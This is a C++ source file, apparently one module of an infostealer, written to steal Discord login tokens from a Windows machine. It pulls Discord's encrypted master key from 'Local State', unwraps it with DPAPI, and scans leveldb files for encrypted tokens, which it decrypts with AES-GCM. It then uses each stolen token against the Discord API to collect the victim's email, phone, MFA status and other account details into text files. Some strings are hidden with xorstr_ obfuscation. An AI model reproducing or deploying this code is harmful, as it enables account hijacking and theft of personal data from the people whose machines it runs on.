//
// Created by .1qxz on 07.06.2024.
//

#include "Discord.h"

void Discord::execute(fs::path &root) {
    for(const std::string& token : this->getTokens())
    {
        Discord::writeTokenInfo(token, root / "Discord");
    }
}

void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {

    std::pair<std::string, int> request = HttpUtils::sendHttpRequest("https://discordapp.com/api/v6/users/@me", "Content-Type: application/json\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAuthorization: " + token);
    if(request.second != 200)
        return;

    json resp = json::parse(request.first);
    std::stringstream ss;
    ss << "ID: " << resp["id"] << "\n";
    ss << "USERNAME: " << resp["username"] << "\n";
    ss << "GLOBAL NAME: " << resp["global_name"] << "\n";
    ss << "LOCALE: " << StringUtils::toUpperCase(resp["locale"]) << "\n";
    ss << "\n";
    ss << "VERIFIED: " << ((resp["verified"] == true) ? "Yes" : "No") << "\n";
    ss << "";
    ss << "EMAIL: " << resp["email"] << "\n";
    ss << "PHONE: " << resp["phone"] << "\n";
    ss << "\n";
    ss << "NSFW ALLOWED: " << ((resp["nsfw_allowed"] == true) ? "Yes" : "No") << "\n";
    ss << "\n";
    ss << "MFA ENABLED: " << ((resp["mfa_enabled"] == true) ? "Yes" : "No") << "\n";
    ss << "";
    ss << "NITRO: " << ((resp["premium_type"] == 1) ? "Yes" : "No") << "\n";

    std::string bio = StringUtils::replace(resp["bio"], "\n", " ");
    if(!bio.empty())
    {
        ss << "\n";
        ss << "BIO: " << bio;
    }

    Utils::writeFile(root / (std::string(resp["username"]) + ".txt"), ss.str());
}

static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";


static inline bool is_base64(BYTE c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<BYTE> base64Decode(const std::string& input) {
    size_t in_len = input.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    BYTE char_array_4[4], char_array_3[3];
    std::vector<BYTE> ret;

    while (in_len-- && ( input[in_] != '=') && is_base64(input[in_])) {
        char_array_4[i++] = input[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j <4; j++)
            char_array_4[j] = 0;

        for (j = 0; j <4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

std::vector<std::string> Discord::getTokens() {
    std::vector<std::string> tokens;

    for(const fs::path& path : this->discord_paths)
    {
        std::vector<std::string> scannedTokens = this->getToken(const_cast<fs::path &>(path));
        if(scannedTokens.empty())
            continue;

        for(const std::string& scannedToken : scannedTokens)
        {
            if(scannedToken.empty())
                continue;

            tokens.push_back(scannedToken);
        }
    }

    return tokens;
}

std::vector<std::string> Discord::getToken(fs::path &root) {

    if(!exists(root))
        return {};

    std::vector<BYTE> masterKey = Discord::getMaterKey(root);
    if(masterKey.empty())
        return {};


    return this->scanToken(root, masterKey);
}

std::vector<BYTE> Discord::getMaterKey(fs::path &root) {
    if(!exists(root))
        return {};

    std::string masterKey;
    try
    {
        fs::path localStatePath = root / xorstr_("Local State");

        if(!exists(localStatePath))
            return {};

        std::string content = Utils::readFile(localStatePath);
        if(content.empty())
            return {};

        json jsonObject = json::parse(content);
        masterKey = jsonObject[xorstr_("os_crypt")][xorstr_("encrypted_key")];
    }
    catch (const std::exception& e)
    {
        return {};
    }

    std::vector<BYTE> decoded_key = base64Decode(masterKey);
    decoded_key.erase(decoded_key.begin(), decoded_key.begin() + 5);

    return decoded_key;
}

std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BYTE>& master_key) {
    std::vector<std::string> tokens;

    fs::path scan_path = root / "Local Storage" / "leveldb";
    std::regex token_regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");

    if (fs::exists(scan_path) && fs::is_directory(scan_path)) {
        for (const fs::path &entry: fs::directory_iterator(scan_path)) {
            if(!(entry.filename().string().ends_with(".ldb") || entry.filename().string().ends_with(".log")))
                continue;

            std::string content = Utils::readFile(entry);
            if(content.empty())
                continue;

            for(std::string &line : StringUtils::splitString(content, '\n'))
            {
                line = std::regex_replace(line, std::regex(R"(\s+$)"), "");
                std::smatch match;

                while (std::regex_search(line, match, token_regex)) {
                    std::string unformatted_token = match.str(0);
                    if (unformatted_token.back() == '\\') {
                        unformatted_token.pop_back();
                    }

                    auto pos = unformatted_token.find("dQw4w9WgXcQ:");
                    if (pos == std::string::npos) {
                        continue;
                    }

                    unformatted_token = unformatted_token.substr(unformatted_token.find("dQw4w9WgXcQ:") + 12);
                    std::vector<BYTE> decoded_token(base64Decode(unformatted_token));

                    std::string decryptedToken = decrypt(decoded_token, master_key);
                    tokens.push_back(decryptedToken);

                    line = match.suffix().str();
                }
            }
        }
    }

    return tokens;
}

std::vector<unsigned char> CryptUnprotectDataWrapper(const std::vector<unsigned char> &data) {
    DATA_BLOB inData, outData;
    inData.pbData = const_cast<BYTE*>(data.data());
    inData.cbData = static_cast<DWORD>(data.size());

    if (CryptUnprotectData(&inData, NULL, NULL, NULL, NULL, 0, &outData)) {
        std::vector<unsigned char> result(outData.pbData, outData.pbData + outData.cbData);
        LocalFree(outData.pbData);
        return result;
    } else {
        return {};
    }
}

std::string Discord::decrypt(const std::vector<unsigned char> &buffer, const std::vector<unsigned char> &master_key) {
    auto decrypted_key = CryptUnprotectDataWrapper(master_key);
    std::vector<unsigned char> iv(buffer.begin() + 3, buffer.begin() + 15);
    std::vector<unsigned char> ciphertext(buffer.begin() + 15, buffer.end() - 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (status != 0) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) return "";

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, decrypted_key.data(), static_cast<ULONG>(decrypted_key.size()), 0);
    if (status != 0) return "";

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv.data();
    authInfo.cbNonce = static_cast<ULONG>(iv.size());
    authInfo.pbTag = const_cast<BYTE*>(buffer.data() + buffer.size() - 16);
    authInfo.cbTag = 16;

    std::vector<unsigned char> decrypted(ciphertext.size());
    ULONG decryptedSize = 0;

    status = BCryptDecrypt(hKey, ciphertext.data(), static_cast<ULONG>(ciphertext.size()), &authInfo, nullptr, 0, decrypted.data(), static_cast<ULONG>(decrypted.size()), &decryptedSize, 0);
    if (status != 0) return "";

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(decrypted.begin(), decrypted.begin() + decryptedSize);
}
